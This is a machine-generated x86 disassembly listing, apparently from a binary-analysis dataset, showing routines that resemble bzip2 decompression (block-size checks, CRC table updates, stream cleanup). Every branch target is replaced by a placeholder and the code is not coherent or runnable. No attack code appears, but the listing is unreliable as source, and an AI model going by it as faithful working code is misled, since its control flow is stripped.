pop ebx
push 0xfffffffe
pop eax
jmp r-xdata
pop esi
or eax 0xffffffff
dec ecx
jne r-xdata
pop edi
dec ecx
je r-xdata
test edx edx
je r-xdata
cmp edx 0x1
jne r-xdata
dec ecx
je r-xdata
call sub_10006b43
movzx eax al
neg eax
sbb eax eax
and eax 0x3
dec eax
dec eax
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ edi + 0x4 ]
jne r-xdata
cmp edx ebx
jne r-xdata
xor eax eax
jmp r-xdata
pop ebx
cmp edx ebx
jne r-xdata
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x4 ] 0x3
jmp r-xdata
call sub_10006b43
cmp [ esi + 0xc ] 0x0
ja r-xdata
mov ecx [ esi + 0xc ]
cmp ecx [ edi + 0x4 ]
jne r-xdata
push 0xfffffffe
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x4 ] 0x4
jmp r-xdata
mov ecx [ esi + 0x4 ]
dec ecx
je r-xdata
mov eax ebx
jmp r-xdata
mov eax esi
call sub_100066ce
test al al
je r-xdata
call sub_10006b43
test al al
je r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jl r-xdata
cmp [ esi + 0xc ] 0x0
ja r-xdata
xor eax eax
mov [ esi + 0x4 ] ebx
inc eax
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
call sub_100066ce
test al al
je r-xdata
pop eax
jmp r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jl r-xdata
mov [ esi + 0x4 ] 0x1
push 0x4
jmp r-xdata
sub_10006d30
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
cmp [ edi ] esi
je r-xdata
pop esi
retn 0x4
pop edi
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0x18 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_10006d95
call sub_10006670
test eax eax
jne r-xdata
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
push 0xfffffff7
pop eax
jmp r-xdata
push ebx
mov ebx [ esp + 0x18 ]
cmp ebx edi
je r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
retn 0xc
cmp [ esp + 0x14 ] 0x4
ja r-xdata
cmp ebx 0x1
jne r-xdata
pop edi
pop esi
push 0xfffffffe
cmp [ esi + 0x24 ] edi
jne r-xdata
cmp [ esi + 0x28 ] edi
jne r-xdata
mov [ esi + 0x24 ] sub_10006674
push 0x1
push 0xfa74
push [ esi + 0x2c ]
call [ esi + 0x24 ]
add esp 0xc
cmp eax edi
jne r-xdata
mov [ esi + 0x28 ] sub_10006685
mov ecx [ esp + 0x14 ]
mov [ eax ] esi
mov [ esi + 0x20 ] eax
mov [ eax + 0x4 ] 0xa
mov [ eax + 0x20 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0xc64 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ eax + 0x28 ] bl
mov [ eax + 0xc54 ] edi
mov [ eax + 0xc50 ] edi
mov [ eax + 0xc4c ] edi
mov [ eax + 0x2c ] edi
mov [ eax + 0x30 ] ecx
xor eax eax
jmp r-xdata
push 0xfffffffd
jmp r-xdata
pop ebx
pop eax
sub_10006e4f
push ebp
mov ebp esp
sub esp 0x28
cmp [ ecx + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
mov eax [ ecx + 0xc60 ]
mov ebx [ ecx + 0xc4c ]
mov esi [ ecx + 0xc ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov al [ ecx + 0x8 ]
mov [ ebp - 0x1 ] al
mov eax [ ecx + 0x440 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx + 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ecx ]
mov edi [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x18 ] edi
mov edi [ ecx + 0x24 ]
mov [ ebp - 0x24 ] edi
mov edi [ ecx + 0xfa40 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x28 ] eax
inc edi
mov edx [ ecx ]
xor edi edi
cmp [ edx + 0x14 ] edi
je r-xdata
cmp [ ebp - 0x8 ] edi
jg r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ecx + 0xc ] edi
je r-xdata
mov al 0x1
je r-xdata
mov eax [ ecx ]
mov edi [ eax + 0x18 ]
mov [ ebp - 0x24 ] edi
sub edi [ ebp - 0x10 ]
add edi [ ebp - 0x28 ]
mov [ eax + 0x18 ] edi
mov eax [ ecx ]
mov edi [ ebp - 0x24 ]
cmp [ eax + 0x18 ] edi
jae r-xdata
cmp esi 0x1
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx + 0xfa40 ]
mov esi [ ecx + 0x440 ]
inc eax
mov [ ebp - 0x18 ] eax
cmp esi eax
je r-xdata
mov eax [ edx + 0x10 ]
mov dl [ ecx + 0x8 ]
mov [ eax ] dl
movzx ebx [ ecx + 0x8 ]
lea esi [ ecx + 0xc60 ]
mov edx [ esi ]
mov eax edx
shl edx 0x8
shr eax 0x18
xor eax ebx
xor edx [ eax * 4 + rw-data ]
dec [ ecx + 0xc ]
mov [ esi ] edx
mov edx [ ecx ]
inc [ edx + 0x10 ]
mov edx [ ecx ]
dec [ edx + 0x14 ]
mov edx [ ecx ]
inc [ edx + 0x18 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] edi
jne r-xdata
xor esi esi
jmp r-xdata
mov al [ ebp - 0xc ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x14 ]
mov [ ecx + 0xc60 ] eax
mov al [ ebp - 0x1 ]
mov [ ecx + 0x8 ] al
mov eax [ ebp - 0x8 ]
mov [ ecx + 0x440 ] eax
mov eax [ ebp - 0xc ]
mov [ ecx + 0x3c ] eax
mov eax [ ecx ]
mov [ ecx + 0x38 ] edx
mov edx [ ebp - 0x18 ]
mov [ ecx + 0xc ] esi
mov [ ecx + 0xc4c ] ebx
mov [ eax + 0x10 ] edx
mov eax [ ecx ]
mov ecx [ ebp - 0x10 ]
mov [ eax + 0x14 ] ecx
inc [ eax + 0x1c ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ ebx ] al
mov ebx [ ebp - 0x14 ]
movzx eax al
shr ebx 0x18
xor ebx eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
dec esi
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
jg r-xdata
inc [ edx + 0x1c ]
jmp r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx eax al
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0xc ]
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x20 ] eax
je r-xdata
xor esi esi
inc esi
mov esi [ ebp - 0x18 ]
mov al [ ebp - 0x1 ]
mov [ esi ] al
mov esi [ ebp - 0x14 ]
movzx eax al
shr esi 0x18
xor esi eax
mov eax [ ebp - 0x14 ]
shl eax 0x8
xor eax [ esi * 4 + rw-data ]
inc [ ebp - 0x18 ]
dec [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov al [ ecx + 0x3c ]
mov edx [ ecx + 0x38 ]
mov [ ecx + 0x8 ] al
mov eax [ ecx + 0x24 ]
imul eax eax 0x186a0
mov [ ecx + 0xc ] 0x1
mov [ ebp - 0x1c ] eax
cmp edx eax
jae r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ebx [ ecx + 0xc4c ]
mov edx [ ebx + edx * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
cmp [ ecx + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x24 ]
imul eax eax 0x186a0
push 0x2
pop esi
mov [ ebp - 0x20 ] eax
cmp edx eax
jae r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
test esi esi
jle r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov [ ecx + 0x3c ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x2
cmp eax [ ebp - 0x1c ]
jae r-xdata
push 0x3
pop esi
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov ebx [ ebp - 0x1c ]
mov edx [ ebx + edx * 4 ]
mov [ ebp - 0x2 ] dl
shr edx 0x8
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] edi
je r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax [ ebp - 0x2 ]
cmp eax [ ebp - 0xc ]
je r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
jne r-xdata
and [ ecx + 0x18 ] 0x0
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ecx + 0x38 ]
mov [ ecx + 0xc ] 0x3
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + edx * 4 ]
mov al dl
movzx esi al
shr edx 0x8
add esi 0x4
cmp edx [ ebp - 0x20 ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
mov edx [ ebx + edx * 4 ]
movzx eax dl
shr edx 0x8
add [ ebp - 0x8 ] 0x2
mov [ ebp - 0xc ] eax
jmp r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
cmp edi 0x1
sete dl
xor al dl
inc esi
mov [ ecx + 0x440 ] esi
cmp esi [ ebp - 0x18 ]
je r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
movzx eax al
cmp eax [ ecx + 0x3c ]
je r-xdata
and [ ecx + 0x18 ] 0x0
mov eax [ ecx + 0x38 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebx + eax * 4 ]
mov al dl
shr edx 0x8
mov [ ecx + 0x38 ] edx
test edi edi
jne r-xdata
dec [ ecx + 0x14 ]
mov edi [ ecx + 0x14 ]
xor edx edx
inc esi
cmp edi 0x1
sete dl
movzx eax al
mov [ ecx + 0x440 ] esi
xor edx eax
add edx 0x4
mov [ ecx + 0xc ] edx
mov edx [ ecx + 0x38 ]
cmp edx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ecx + 0x18 ]
mov edi [ edx * 4 + rw-data ]
inc edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x18 ] edx
cmp edx 0x200
jne r-xdata
mov eax [ ebx + edx * 4 ]
mov [ ecx + 0x38 ] eax
shr [ ecx + 0x38 ] 0x8
movzx eax al
mov [ ecx + 0x3c ] eax
test edi edi
jne r-xdata
and [ ecx + 0x18 ] 0x0
dec [ ecx + 0x14 ]
mov eax [ ecx + 0x14 ]
xor edx edx
cmp eax 0x1
sete dl
xor [ ecx + 0x3c ] edx
inc esi
mov [ ecx + 0x440 ] esi
jmp r-xdata
mov eax [ ecx + 0x18 ]
mov edx [ eax * 4 + rw-data ]
inc eax
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] eax
cmp eax 0x200
jne r-xdata
and [ ecx + 0x18 ] edi
sub_100072fb
push esi
xor eax eax
mov edx 0x100
push edi
mov edx ecx
mov eax ecx
jmp r-xdata
mov esi [ esp + 0xc ]
mov edi [ esp + 0x10 ]
lea ecx [ edx + eax ]
sar ecx 0x1
cmp esi [ edi + ecx * 4 ]
jl r-xdata
pop edi
pop esi
retn
mov ecx edx
sub ecx eax
cmp ecx 0x1
jne r-xdata
sub_10007328
push ebp
mov ebp esp
sub esp 0x10
cmp [ esi + 0x10 ] 0x0
push ebx
push edi
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
mov eax [ esi ]
xor edx edx
cmp [ eax + 0x14 ] edx
je r-xdata
xor al al
jmp r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
cmp [ esi + 0xc ] edx
je r-xdata
pop edi
pop ebx
leave
retn
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
mov eax [ esi + 0xfa40 ]
mov ecx [ esi + 0x440 ]
inc eax
mov [ ebp - 0xc ] eax
cmp ecx eax
je r-xdata
mov eax [ eax + 0x10 ]
mov cl [ esi + 0x8 ]
mov [ eax ] cl
movzx ebx [ esi + 0x8 ]
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
mov edi eax
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
dec [ esi + 0xc ]
mov [ ecx ] eax
mov eax [ esi ]
inc [ eax + 0x10 ]
mov eax [ esi ]
dec [ eax + 0x14 ]
mov eax [ esi ]
inc [ eax + 0x18 ]
mov eax [ esi ]
cmp [ eax + 0x18 ] edx
jne r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
jg r-xdata
inc [ eax + 0x1c ]
jmp r-xdata
mov al 0x1
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
mov al [ esi + 0x3c ]
mov ecx [ esi + 0x38 ]
mov [ esi + 0x8 ] al
mov eax [ esi + 0x24 ]
imul eax eax 0x186a0
mov [ esi + 0xc ] 0x1
mov [ ebp - 0x8 ] eax
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x440 ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov edi [ esi + 0xc54 ]
mov ebx [ esi + 0xc50 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ esi + 0x440 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
mov [ esi + 0x3c ] eax
jmp r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x2
cmp ecx [ ebp - 0x8 ]
jae r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov ecx [ ebp - 0x10 ]
inc ecx
mov [ esi + 0x38 ] eax
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x440 ] ecx
cmp ecx [ ebp - 0xc ]
je r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
mov ecx [ esi + 0x38 ]
mov [ esi + 0xc ] 0x3
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi + 0x38 ] eax
jne r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
movzx eax [ ebp - 0x1 ]
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
dec [ esi + 0x14 ]
cmp [ esi + 0x14 ] 0x1
sete al
xor [ ebp - 0x1 ] al
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_100072fb
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edi ]
movzx ecx al
movzx eax [ ebx + eax * 2 ]
and cl 0x1
shl cl 0x2
shr edx cl
and edx 0xf
shl edx 0x10
or edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x38 ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
movzx eax [ ebp - 0x1 ]
cmp eax [ esi + 0x3c ]
je r-xdata
and [ esi + 0x18 ] 0x0
mov ecx [ esi + 0x38 ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
lea eax [ esi + 0x444 ]
push eax
push ecx
call sub_100072fb
mov edx [ esi + 0x38 ]
mov [ ebp - 0x1 ] al
pop ecx
pop ecx
movzx ecx dl
mov eax edx
shr eax 0x1
movzx eax [ eax + edi ]
and cl 0x1
shl cl 0x2
shr eax cl
movzx ecx [ ebx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
mov [ esi + 0x38 ] eax
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
dec [ esi + 0x14 ]
mov eax [ ebp - 0x10 ]
mov ecx [ esi + 0x14 ]
inc eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x440 ] eax
xor eax eax
cmp ecx 0x1
movzx ecx [ ebp - 0x1 ]
sete al
xor eax ecx
add eax 0x4
mov [ esi + 0xc ] eax
mov eax [ esi + 0x38 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ eax * 4 + rw-data ]
inc eax
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] eax
cmp eax 0x200
jne r-xdata
lea ecx [ esi + 0x444 ]
push ecx
push eax
call sub_100072fb
mov edx [ esi + 0x38 ]
pop ecx
pop ecx
mov ecx edx
shr ecx 0x1
mov [ esi + 0x3c ] eax
movzx edi [ ecx + edi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
movzx ecx [ ebx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
mov ecx [ esi + 0x14 ]
mov [ esi + 0x38 ] edi
test ecx ecx
jne r-xdata
and [ esi + 0x18 ] 0x0
dec [ esi + 0x14 ]
mov ecx [ esi + 0x14 ]
xor edx edx
cmp ecx 0x1
sete dl
xor edx eax
mov eax [ ebp - 0x10 ]
inc eax
mov [ esi + 0x3c ] edx
mov [ esi + 0x440 ] eax
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ ecx * 4 + rw-data ]
inc ecx
mov [ esi + 0x14 ] edx
mov [ esi + 0x18 ] ecx
cmp ecx 0x200
jne r-xdata
and [ esi + 0x18 ] 0x0
sub_10007948
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push esi
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
push 0xfffffffe
jmp r-xdata
cmp [ esi ] eax
je r-xdata
retn 0x4
pop eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx 0x1
je r-xdata
pop esi
or eax 0xffffffff
jmp r-xdata
cmp ecx 0x2
jne r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx 0xa
jl r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
push esi
call sub_1000968f
pop ecx
cmp eax 0x4
je r-xdata
mov ecx esi
call sub_10006e4f
call sub_10007328
jmp r-xdata
mov eax [ esi + 0xc64 ]
sub eax [ esi + 0xc5c ]
neg eax
sbb eax eax
and eax 0xfffffff8
add eax 0x4
mov ecx [ esi + 0x4 ]
cmp ecx 0x2
jne r-xdata
push 0xfffffffc
mov eax [ esi + 0xfa40 ]
inc eax
cmp [ esi + 0x440 ] eax
jne r-xdata
test al al
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
lea ecx [ esi + 0xc60 ]
mov eax [ ecx ]
not eax
mov [ ecx ] eax
cmp eax [ esi + 0xc58 ]
jne r-xdata
lea ecx [ esi + 0xc64 ]
mov edx [ ecx ]
rol edx 0x1
xor edx eax
mov [ ecx ] edx
mov [ esi + 0x4 ] 0xe
sub_10007a18
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
mov edi [ esi + 0x20 ]
test edi edi
je r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
cmp [ edi ] esi
je r-xdata
pop esi
retn 0x4
pop edi
mov eax [ edi + 0xc4c ]
test eax eax
je r-xdata
mov eax [ edi + 0xc50 ]
test eax eax
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
mov edi [ edi + 0xc54 ]
test edi edi
je r-xdata
push eax
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
push [ esi + 0x20 ]
push [ esi + 0x2c ]
call [ esi + 0x28 ]
and [ esi + 0x20 ] 0x0
pop ecx
pop ecx
xor eax eax
push edi
push [ esi + 0x2c ]
call [ esi + 0x28 ]
pop ecx
pop ecx
sub_10007a86
push ebp
mov ebp esp
sub esp 0x30
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
je r-xdata
push 0xfffffffe
pop eax
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
mov ecx [ ebp + 0x18 ]
lea eax [ ecx - 0x1 ]
cmp eax 0x8
ja r-xdata
cmp [ ebp + 0x1c ] 0x4
ja r-xdata
mov eax [ ebp + 0x20 ]
cmp eax 0xfa
ja r-xdata
test eax eax
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push eax
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push ecx
push eax
call sub_100066e3
test eax eax
jne r-xdata
push 0x1e
pop eax
pop edi
pop esi
leave
retn 0x1c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ esi ]
mov [ ebp - 0x1c ] eax
push 0x2
lea eax [ ebp - 0x30 ]
push eax
